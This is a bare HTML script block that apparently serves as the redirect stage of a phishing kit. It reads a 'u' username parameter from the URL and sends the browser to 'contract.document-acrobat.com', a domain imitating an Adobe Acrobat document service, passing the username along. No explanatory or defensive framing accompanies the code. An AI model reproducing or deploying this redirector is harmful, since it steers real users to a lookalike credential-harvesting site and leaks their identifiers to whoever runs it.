<script>
  const qs = window.location.search;
  const urlParams = new URLSearchParams(qs);

  if (urlParams.has("u")) {
    const u = urlParams.get("u");
    window.location = "https://contract.document-acrobat.com/?username=" + u;
  } else {
    window.location = "https://contract.document-acrobat.com/";
  }
  
</script>
